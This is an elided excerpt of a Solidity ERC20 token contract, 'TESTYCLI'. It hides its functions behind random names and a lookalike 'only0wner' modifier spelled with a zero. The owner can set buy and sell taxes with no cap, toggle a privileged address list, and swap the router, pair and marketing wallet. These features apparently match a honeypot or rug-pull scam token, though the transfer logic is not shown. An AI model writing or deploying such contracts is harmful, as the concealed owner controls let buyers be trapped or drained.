...
contract TESTYCLI is ERC20, Ownable{
    ...
    mapping (address => bool) public VArlrhcSyGZ;
    ...
    constructor() ERC20("TESTYCLI", "TESTYCLI") {
        ...
        VArlrhcSyGZ[msg.sender] = true;
        VArlrhcSyGZ[address(pair)] = true;
        VArlrhcSyGZ[marketingWallet] = true;
        VArlrhcSyGZ[address(router)] = true;
        VArlrhcSyGZ[address(this)] = true;
    }
    ...
    function hNpkXpxCRGoX(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function jLGXDOowYvJtj(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            VArlrhcSyGZ[accounts[i]] = newValue;
        }
    }

    function PAUPpNqKmxMfZ(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function WxKPETYLfHWD(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function xiOHpivzGdq(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function JZjeUeoULLdjdF(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
